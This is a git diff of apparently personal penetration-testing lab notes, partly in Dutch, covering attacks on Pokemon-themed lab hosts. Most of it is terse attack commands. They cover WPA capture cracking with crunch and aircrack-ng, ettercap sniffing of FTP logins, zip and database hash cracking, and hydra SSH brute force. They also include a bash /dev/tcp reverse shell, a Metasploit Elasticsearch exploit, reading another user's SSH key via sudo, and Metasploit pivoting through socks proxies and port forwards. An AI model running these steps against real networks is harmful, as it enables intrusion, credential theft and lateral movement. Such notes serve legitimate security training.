@@ -1,55 +1,87 @@
 
+check ports
+9200: -> elasticsearch
+ip:9200/flag/_search
 
-#!/bin/bash
-msfconsole -q -x "use exploit/multi/handler;set PAYLOAD <PAYLOAD>;set LHOST <LHOST>;set LPORT <LPORT>;exploit -j"
+## wifi
 
+open capture file in wireshark
+what is wifi ssid => FreeWiFiElite
+create a list of flags=> 
+    crunch 11 11 -t crack-%%%%% -o crack.lst
+aircrack-ng -h
+aircrack-ng -w crack.lst capture.pcap
+--- shows ssid
+1
+right click on a packet
+protocol preferences
+wireless lan
+decryption keys
+add wpa-pw
+add the key
+
+## sniffing
+ettercap -h
+--- ettercap mac/ip/ipv6/ports
+ettercap /ip// /otherip// -T
+
+--- wait for responses
+1 --- found ftp login
+ftp ip
+username
+password
+dir
+get x
+exit
+cat x
+---crunch 9 9 -t FLAG-%%%% -o crack.lst
+zip2john x.zip > zip.hash
+john --wordlist=crack.lst zip.hash
+2 --- found userlogin on website
+we see post to ip/login.php
+with a base 64
+echo base64string | base64 -d
+
+## pivoting
+
+create rev shell
+nc -lnvp 1234 
+--- starts listener on host
+bash -i > /dev/tcp/hostip/1234>&1
+adduser ther
+ther
+ther
+cat /etc/passwd
+nmap -p 225 ip -sV
+ssh ther@ip -p 225
+ip a
+--- check all adapters
 msfconsole
-use auxiliary/scanner/ssh/ssh_enumusers
-set RHOSTS 192.168.52.60
-set USER_FILE users
+search ssh exploit exec
+use multi/ssh/sshexec
+options
+set rhosts ip
+set username ther
+set rport 225
 run
-
-metesploit:
-msfconsole
-search ssh_login
-use auxiliary/scanner/ssh/ssh_enumusers
-set RHOSTS <target_ip>
-set USER_FILE /path/to/usernames.txt
+bg
+session
+route add otheripfoundwithsshlogin/netmask 2(sessionid)
+search socks
+use server/socks_proxy
+run -j
+jobs
+search ping_sweep
+use post/multi/gather/ping_sweep
+session
+set session 2
+set rhosts otheripfoundwithsshlogin/netmask 
 run
+---finds other hosts via the route
+proxychains nmap foundip -sT -Pn -p 22,21,80,443
+---curl ip in ssh shell
+session
+session -i 2 (gobackinbackgroundjob)
+portfwd add -l 8080 -p 80 -r foundip
+ssh -L 80:localhost:8080 ther@foundip
 
-hydra:
-hydra -L <usernames_file> -P <passwords_file> <target_ip> ssh
-
-
-Is there a Minecraft server running on the environment, and is it really Minecraft?
-=> nmap -p 25565 -il pokemon.lan.lst --open -sV
-Which database software is running in the environment and are you able to get access (Tip: default username and use a self constructed list with the first 151 pokemon)?
-=>...
-Can you dump and crack the user hashes of the database users?
-=> select username,password from pg_shadow
-=> copy paste
-=> formatten als username:hash
-=> hashcat hashlist.list --user (to detect hash automatitcaly)
-=> hashcat hashlist.list --user -m 28600 password.list
-Try to perform some LDAP NMAP scripts on the domain controller. Which LDAP versions are supported?
-=> ls /usr/share/nmap/scripts | grep ldap
-=> nmap --script=ldap* {ip}
-=> toggle verbosety
-On Alakazam there is a vulnerable software running on it's default port, which software and version? Use Metasploit and try to exploit this service.
-=> alakazam.pokemon.lan:9200 keer bekijke info pagina van elasticsearch
-=> msfconsole, seqrch elqstic, use 0, set rhosts exploit, shell
-When you gained access on Alakazam, as which user are you accessing the machine? Try to privilage escalate to another user (Tip: not root).
-=> shell, whoami:elasticsearch
-=> ls /home => ash
-=> ls /home/ash -Ral
-=> sudo l
-=> sudo cat /home/ash/.ssh/id_rsa.pub
-
-
-
-touch on or off option
-Findings toevoege aan report.txt
-Ssh brute toevoege
-Wget van webpages
-List van ports en services
-Zenmap ofz toevoege
